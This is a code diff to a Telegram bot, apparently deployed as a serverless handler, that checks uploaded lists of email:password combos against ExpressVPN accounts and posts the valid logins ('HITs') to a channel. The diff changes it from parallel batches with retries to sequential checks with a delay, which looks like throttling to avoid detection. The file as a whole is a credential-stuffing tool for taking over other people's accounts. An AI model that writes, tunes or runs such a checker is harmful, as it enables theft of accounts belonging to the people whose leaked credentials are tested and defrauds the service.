@@ -1,9 +1,6 @@
-// api/telegram.js – ExpressVPN Bot (fast parallel checking – 10 at a time)
+// api/telegram.js – ExpressVPN Bot (10MS style: progress every 10, hits after all)
 import { checkExpressVPN } from '../lib/expressChecker.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
-
-// প্রতি ব্যাচে কতটি কম্বো প্যারালালে চেক হবে
-const CONCURRENCY = 10;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
@@ -21,13 +18,12 @@ export default async function handler(req, res) {
       "🤖 *ExpressVPN Checker Bot*\n\n" +
       "Send a `.txt` file with combos:\n" +
       "`email:password` (one per line)\n\n" +
-      "⚡ *Fast mode:* 10 combos checked simultaneously.\n" +
-      "HITs are sent to the channel after finishing."
+      "I'll check them one by one and send HITs to the channel after finishing."
     );
     return res.status(200).json({ ok: true });
   }
 
-  // File upload
+  // File upload – accept any .txt
   if (document && (
       document.mime_type === 'text/plain' ||
       document.mime_type === 'application/octet-stream' ||
@@ -62,7 +58,6 @@ export default async function handler(req, res) {
       return res.status(200).json({ ok: false });
     }
 
-    // Immediate response, processing in background
     res.status(200).json({ ok: true });
     setTimeout(() => processCombos(chatId, combos), 100);
     return;
@@ -71,48 +66,32 @@ export default async function handler(req, res) {
   return res.status(200).json({ ok: true });
 }
 
-// ===== প্রসেসিং (প্যারালাল, প্রতি ব্যাচে ১০টি) =====
+// ===== প্রসেসিং (প্রতি ১০টায় প্রগ্রেস, শেষে HIT একসাথে) =====
 async function processCombos(chatId, combos) {
   const total = combos.length;
-  const hits = [];
-  let processed = 0;
+  let hits = []; // HIT গুলো এখানে জমা হবে
   const startTime = Date.now();
 
-  await sendMessage(chatId, `📥 Received ${total} combos. Checking at 10/sec...`);
+  await sendMessage(chatId, `📥 Received ${total} combos. Checking...`);
 
-  // ব্যাচে ভাগ করে প্যারালালে চেক
-  for (let i = 0; i < combos.length; i += CONCURRENCY) {
-    const batch = combos.slice(i, i + CONCURRENCY);
+  for (let i = 0; i < combos.length; i++) {
+    const combo = combos[i];
+    const result = await checkExpressVPN(combo.username, combo.password);
 
-    const batchResults = await Promise.all(
-      batch.map(async (combo) => {
-        // রিট্রাই লজিক (২ বার)
-        let result = null;
-        for (let attempt = 0; attempt < 2; attempt++) {
-          try {
-            result = await checkExpressVPN(combo.username, combo.password);
-            if (result && (result.valid || result.hit)) break; // সফল হলে থামো
-          } catch (e) {
-            result = { valid: false, hit: false, message: e.message };
-          }
-          // রিট্রাই করার আগে সামান্য বিরতি
-          await new Promise(r => setTimeout(r, 300));
-        }
-        return { combo, result };
-      })
-    );
-
-    // এই ব্যাচের HIT গুলো সংগ্রহ
-    for (const { result } of batchResults) {
-      processed++;
-      if (result && result.hit) hits.push(result);
+    if (result.hit) {
+      hits.push(result); // শুধু জমা করো, এখনই চ্যানেলে পাঠাবে না
     }
 
-    // প্রতি ব্যাচ শেষে প্রগ্রেস আপডেট
-    await sendMessage(chatId, `⏳ Progress: ${processed}/${total} | HITs so far: ${hits.length}`);
+    // প্রতি ১০টি বা শেষে প্রগ্রেস
+    if ((i + 1) % 10 === 0 || i + 1 === total) {
+      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | Hits so far: ${hits.length}`);
+    }
+
+    // 300ms ডিলে
+    await new Promise(r => setTimeout(r, 300));
   }
 
-  // ===== সব চেক শেষ – HIT গুলো চ্যানেলে পাঠাও =====
+  // ===== সব চেক শেষ – এখন HIT গুলো চ্যানেলে পাঠাও =====
   if (hits.length > 0) {
     await sendMessage(chatId, `🔥 Sending ${hits.length} HIT(s) to the channel...`);
     for (const hit of hits) {
@@ -124,10 +103,14 @@ async function processCombos(chatId, combos) {
   const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
   let summary = `✅ *Checking complete!*\nTotal: ${total}\n🔥 HITS: ${hits.length}\n⏱️ Time: ${elapsed}s`;
 
+  // HIT গুলোর তালিকা সারাংশে
   if (hits.length > 0) {
     summary += `\n\n📋 *HIT combos:*\n`;
-    hits.forEach(h => { summary += `${h.email}:${h.password}\n`; });
+    hits.forEach(h => {
+      summary += `${h.email}:${h.password}\n`;
+    });
   }
+
   await sendMessage(chatId, summary);
 }
 
